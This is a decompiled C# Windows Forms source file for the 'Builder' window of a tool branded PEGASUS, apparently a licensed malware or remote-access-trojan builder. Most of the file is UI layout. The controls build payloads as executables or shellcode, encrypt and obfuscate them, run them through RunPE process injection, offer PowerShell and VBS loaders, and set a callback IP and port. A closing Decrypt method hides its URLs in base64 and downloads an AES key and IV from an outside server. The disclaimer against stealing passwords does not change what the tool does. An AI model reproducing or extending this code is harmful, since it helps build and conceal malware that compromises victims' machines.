		guna2HtmlToolTip1.SetToolTip(chkVBS, "Obfuscate Payload!");
		chkVBS.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkVBS.UncheckedState.BorderRadius = 0;
		chkVBS.UncheckedState.BorderThickness = 1;
		chkVBS.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkVBS.Visible = false;
		chkPowershell.AutoSize = true;
		chkPowershell.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkPowershell.CheckedState.BorderRadius = 0;
		chkPowershell.CheckedState.BorderThickness = 1;
		chkPowershell.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkPowershell.CheckMarkColor = System.Drawing.Color.FromArgb(125, 125, 125);
		guna2Transition2.SetDecoration(chkPowershell, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkPowershell, Guna.UI2.AnimatorNS.DecorationType.None);
		chkPowershell.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		chkPowershell.Location = new System.Drawing.Point(465, 416);
		chkPowershell.Name = "chkPowershell";
		chkPowershell.Size = new System.Drawing.Size(113, 17);
		chkPowershell.TabIndex = 129;
		chkPowershell.Text = "Powershell Loader";
		guna2HtmlToolTip1.SetToolTip(chkPowershell, "Obfuscate Payload!");
		chkPowershell.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkPowershell.UncheckedState.BorderRadius = 0;
		chkPowershell.UncheckedState.BorderThickness = 1;
		chkPowershell.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkPowershell.Visible = false;
		chVRunPe.AutoSize = true;
		chVRunPe.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chVRunPe.CheckedState.BorderRadius = 0;
		chVRunPe.CheckedState.BorderThickness = 1;
		chVRunPe.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chVRunPe.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chVRunPe, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chVRunPe, Guna.UI2.AnimatorNS.DecorationType.None);
		chVRunPe.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		chVRunPe.Location = new System.Drawing.Point(465, 330);
		chVRunPe.Name = "chVRunPe";
		chVRunPe.Size = new System.Drawing.Size(114, 17);
		chVRunPe.TabIndex = 123;
		chVRunPe.Text = "PEGASUS RunPE";
		guna2HtmlToolTip1.SetToolTip(chVRunPe, "Encrypt Payload and run via RunPe!");
		chVRunPe.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chVRunPe.UncheckedState.BorderRadius = 0;
		chVRunPe.UncheckedState.BorderThickness = 1;
		chVRunPe.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chVRunPe.CheckedChanged += new System.EventHandler(chVRunPe_CheckedChanged);
		chkObfu.AutoSize = true;
		chkObfu.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkObfu.CheckedState.BorderRadius = 0;
		chkObfu.CheckedState.BorderThickness = 1;
		chkObfu.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkObfu.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkObfu, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkObfu, Guna.UI2.AnimatorNS.DecorationType.None);
		chkObfu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		chkObfu.Location = new System.Drawing.Point(330, 330);
		chkObfu.Name = "chkObfu";
		chkObfu.Size = new System.Drawing.Size(103, 17);
		chkObfu.TabIndex = 119;
		chkObfu.Text = "Encrypt Payload";
		guna2HtmlToolTip1.SetToolTip(chkObfu, "Obfuscate Payload!");
		chkObfu.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkObfu.UncheckedState.BorderRadius = 0;
		chkObfu.UncheckedState.BorderThickness = 1;
		chkObfu.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2Separator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator2.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Separator2.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator2.Location = new System.Drawing.Point(-147, -3);
		guna2Separator2.Name = "guna2Separator2";
		guna2Separator2.Size = new System.Drawing.Size(1299, 10);
		guna2Separator2.TabIndex = 126;
		guna2Separator2.UseTransparentBackground = true;
		richTextBox2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		richTextBox2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		guna2Transition2.SetDecoration(richTextBox2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(richTextBox2, Guna.UI2.AnimatorNS.DecorationType.None);
		richTextBox2.ForeColor = System.Drawing.Color.FromArgb(22, 22, 22);
		richTextBox2.Location = new System.Drawing.Point(580, 320);
		richTextBox2.Name = "richTextBox2";
		richTextBox2.Size = new System.Drawing.Size(100, 96);
		richTextBox2.TabIndex = 125;
		richTextBox2.Text = "";
		btnShellcode.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnShellcode.BorderThickness = 1;
		btnShellcode.CheckedState.Parent = btnShellcode;
		btnShellcode.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnShellcode.CustomImages.Parent = btnShellcode;
		guna2Transition2.SetDecoration(btnShellcode, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnShellcode, Guna.UI2.AnimatorNS.DecorationType.None);
		btnShellcode.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnShellcode.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
		btnShellcode.DisabledState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnShellcode.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnShellcode.DisabledState.ForeColor = System.Drawing.Color.DimGray;
		btnShellcode.DisabledState.Parent = btnShellcode;
		btnShellcode.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnShellcode.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnShellcode.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnShellcode.ForeColor = System.Drawing.Color.White;
		btnShellcode.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnShellcode.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnShellcode.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnShellcode.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnShellcode.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnShellcode.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnShellcode.HoverState.Parent = btnShellcode;
		btnShellcode.Location = new System.Drawing.Point(329, 383);
		btnShellcode.Name = "btnShellcode";
		btnShellcode.ShadowDecoration.Parent = btnShellcode;
		btnShellcode.Size = new System.Drawing.Size(244, 30);
		btnShellcode.TabIndex = 124;
		btnShellcode.Text = "Build As ShellCode";
		btnShellcode.Click += new System.EventHandler(btnShelocode_Click);
		label6.AutoSize = true;
		guna2Transition1.SetDecoration(label6, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label6, Guna.UI2.AnimatorNS.DecorationType.None);
		label6.Location = new System.Drawing.Point(326, 262);
		label6.Name = "label6";
		label6.Size = new System.Drawing.Size(237, 65);
		label6.TabIndex = 120;
		label6.Text = "Please do not use this software to attack people \r\nand steal they passwords and money.\r\nBe informed that we can terminate your lisence if\r\n we get reports or notice any ilegal activity!\r\n\r\n";
		btnBuild.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnBuild.BorderThickness = 1;
		btnBuild.CheckedState.Parent = btnBuild;
		btnBuild.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnBuild.CustomImages.Parent = btnBuild;
		guna2Transition2.SetDecoration(btnBuild, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnBuild, Guna.UI2.AnimatorNS.DecorationType.None);
		btnBuild.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnBuild.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
		btnBuild.DisabledState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnBuild.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnBuild.DisabledState.ForeColor = System.Drawing.Color.DimGray;
		btnBuild.DisabledState.Parent = btnBuild;
		btnBuild.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnBuild.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnBuild.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnBuild.ForeColor = System.Drawing.Color.White;
		btnBuild.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnBuild.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnBuild.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnBuild.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnBuild.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnBuild.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnBuild.HoverState.Parent = btnBuild;
		btnBuild.Location = new System.Drawing.Point(329, 350);
		btnBuild.Name = "btnBuild";
		btnBuild.ShadowDecoration.Parent = btnBuild;
		btnBuild.Size = new System.Drawing.Size(244, 30);
		btnBuild.TabIndex = 118;
		btnBuild.Text = "Build As Exe";
		btnBuild.Click += new System.EventHandler(BtnBuild_Click);
		guna2PictureBox2.BackColor = System.Drawing.Color.Transparent;
		guna2Transition2.SetDecoration(guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2PictureBox2.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox2.Image");
		guna2PictureBox2.ImageRotate = 0f;
		guna2PictureBox2.Location = new System.Drawing.Point(391, 154);
		guna2PictureBox2.Name = "guna2PictureBox2";
		guna2PictureBox2.ShadowDecoration.Parent = guna2PictureBox2;
		guna2PictureBox2.Size = new System.Drawing.Size(122, 105);
		guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox2.TabIndex = 121;
		guna2PictureBox2.TabStop = false;
		guna2PictureBox2.UseTransparentBackground = true;
		guna2PictureBox3.BackColor = System.Drawing.Color.Transparent;
		guna2Transition2.SetDecoration(guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2PictureBox3.FillColor = System.Drawing.Color.Transparent;
		guna2PictureBox3.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox3.Image");
		guna2PictureBox3.ImageRotate = 0f;
		guna2PictureBox3.Location = new System.Drawing.Point(391, 154);
		guna2PictureBox3.Name = "guna2PictureBox3";
		guna2PictureBox3.ShadowDecoration.Parent = guna2PictureBox3;
		guna2PictureBox3.Size = new System.Drawing.Size(122, 105);
		guna2PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox3.TabIndex = 122;
		guna2PictureBox3.TabStop = false;
		guna2PictureBox3.UseTransparentBackground = true;
		guna2PictureBox3.Visible = false;
		guna2Transition2.SetDecoration(guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2PictureBox4.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox4.Image");
		guna2PictureBox4.ImageRotate = 0f;
		guna2PictureBox4.Location = new System.Drawing.Point(304, 8);
		guna2PictureBox4.Name = "guna2PictureBox4";
		guna2PictureBox4.ShadowDecoration.Parent = guna2PictureBox4;
		guna2PictureBox4.Size = new System.Drawing.Size(300, 155);
		guna2PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox4.TabIndex = 127;
		guna2PictureBox4.TabStop = false;
		guna2Panel1.Controls.Add(guna2Separator1);
		guna2Panel1.Controls.Add(pictureBox1);
		guna2Panel1.Controls.Add(label15);
		guna2Transition1.SetDecoration(guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		guna2Panel1.Location = new System.Drawing.Point(0, 0);
		guna2Panel1.Name = "guna2Panel1";
		guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
		guna2Panel1.Size = new System.Drawing.Size(902, 67);
		guna2Panel1.TabIndex = 136;
		guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
		guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator1.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator1.Location = new System.Drawing.Point(-198, 61);
		guna2Separator1.Name = "guna2Separator1";
		guna2Separator1.Size = new System.Drawing.Size(1299, 10);
		guna2Separator1.TabIndex = 13;
		guna2Separator1.UseTransparentBackground = true;
		guna2Transition2.SetDecoration(pictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(pictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		pictureBox1.Location = new System.Drawing.Point(12, 12);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new System.Drawing.Size(40, 43);
		pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 12;
		pictureBox1.TabStop = false;
		label15.AutoSize = true;
		guna2Transition1.SetDecoration(label15, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label15, Guna.UI2.AnimatorNS.DecorationType.None);
		label15.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		label15.Location = new System.Drawing.Point(419, 19);
		label15.Name = "label15";
		label15.Size = new System.Drawing.Size(88, 20);
		label15.TabIndex = 11;
		label15.Text = "BUILDER";
		guna2Transition1.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Particles;
		guna2Transition1.Cursor = null;
		animation.AnimateOnlyDifferences = true;
		animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation1.BlindCoeff");
		animation.LeafCoeff = 0f;
		animation.MaxTime = 1f;
		animation.MinTime = 0f;
		animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation1.MosaicCoeff");
		animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation1.MosaicShift");
		animation.MosaicSize = 1;
		animation.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
		animation.RotateCoeff = 0f;
		animation.RotateLimit = 0f;
		animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation1.ScaleCoeff");
		animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation1.SlideCoeff");
		animation.TimeCoeff = 2f;
		animation.TransparencyCoeff = 0f;
		guna2Transition1.DefaultAnimation = animation;
		guna2Transition2.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Particles;
		guna2Transition2.Cursor = null;
		animation2.AnimateOnlyDifferences = true;
		animation2.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation2.BlindCoeff");
		animation2.LeafCoeff = 0f;
		animation2.MaxTime = 1f;
		animation2.MinTime = 0f;
		animation2.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation2.MosaicCoeff");
		animation2.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation2.MosaicShift");
		animation2.MosaicSize = 1;
		animation2.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
		animation2.RotateCoeff = 0f;
		animation2.RotateLimit = 0f;
		animation2.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation2.ScaleCoeff");
		animation2.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation2.SlideCoeff");
		animation2.TimeCoeff = 2f;
		animation2.TransparencyCoeff = 0f;
		guna2Transition2.DefaultAnimation = animation2;
		guna2BorderlessForm1.ContainerControl = this;
		guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.TargetForm = this;
		guna2HtmlToolTip1.AllowLinksHandling = true;
		guna2HtmlToolTip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		guna2HtmlToolTip1.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2HtmlToolTip1.ForeColor = System.Drawing.Color.LightGray;
		guna2HtmlToolTip1.MaximumSize = new System.Drawing.Size(0, 0);
		guna2HtmlToolTip1.TitleFont = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		guna2HtmlToolTip1.TitleForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2HtmlToolTip1.ToolTipTitle = "PEGASUS";
		guna2GradientButton1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		guna2GradientButton1.BorderThickness = 1;
		guna2GradientButton1.CheckedState.Parent = guna2GradientButton1;
		guna2GradientButton1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		guna2GradientButton1.CustomImages.Parent = guna2GradientButton1;
		guna2Transition2.SetDecoration(guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		guna2GradientButton1.DisabledState.Parent = guna2GradientButton1;
		guna2GradientButton1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2GradientButton1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		guna2GradientButton1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		guna2GradientButton1.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2GradientButton1.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2GradientButton1.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		guna2GradientButton1.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2GradientButton1.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2GradientButton1.HoverState.Parent = guna2GradientButton1;
		guna2GradientButton1.Location = new System.Drawing.Point(589, 251);
		guna2GradientButton1.Name = "guna2GradientButton1";
		guna2GradientButton1.ShadowDecoration.Parent = guna2GradientButton1;
		guna2GradientButton1.Size = new System.Drawing.Size(101, 21);
		guna2GradientButton1.TabIndex = 158;
		guna2GradientButton1.Text = "Default Port";
		guna2HtmlToolTip1.SetToolTip(guna2GradientButton1, "Add IP/Port to the list!");
		guna2GradientButton1.Click += new System.EventHandler(guna2GradientButton1_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		base.ClientSize = new System.Drawing.Size(902, 586);
		base.Controls.Add(guna2PictureBox1);
		base.Controls.Add(guna2TabControl1);
		base.Controls.Add(guna2Panel1);
		guna2Transition2.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
		Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		ForeColor = System.Drawing.Color.LightGray;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormBuilder";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		Text = "Builder";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormBuilder_FormClosed);
		base.Load += new System.EventHandler(Builder_Load);
		((System.ComponentModel.ISupportInitialize)picIcon).EndInit();
		guna2ContextMenuStrip2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
		guna2TabControl1.ResumeLayout(false);
		tabPage1.ResumeLayout(false);
		tabPage1.PerformLayout();
		guna2GroupBox5.ResumeLayout(false);
		guna2GroupBox4.ResumeLayout(false);
		guna2GroupBox4.PerformLayout();
		tabPage2.ResumeLayout(false);
		tabPage2.PerformLayout();
		guna2GroupBox3.ResumeLayout(false);
		guna2GroupBox3.PerformLayout();
		((System.ComponentModel.ISupportInitialize)numDelay).EndInit();
		tabPage3.ResumeLayout(false);
		guna2GroupBox1.ResumeLayout(false);
		guna2GroupBox1.PerformLayout();
		tabPage4.ResumeLayout(false);
		guna2GroupBox2.ResumeLayout(false);
		guna2GroupBox2.PerformLayout();
		tabPage5.ResumeLayout(false);
		tabPage5.PerformLayout();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox2).EndInit();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox3).EndInit();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox4).EndInit();
		guna2Panel1.ResumeLayout(false);
		guna2Panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
		ResumeLayout(false);
	}

	public static string Decrypt(string encrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string str = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2tleS50eHQ=")));
		string str2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2l2LnR4dA==")));
		byte[] array = Convert.FromBase64String(encrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(reupload(str));
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(reupload(str2));
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		cryptoTransform.Dispose();
		return Encoding.ASCII.GetString(bytes);
	}
} }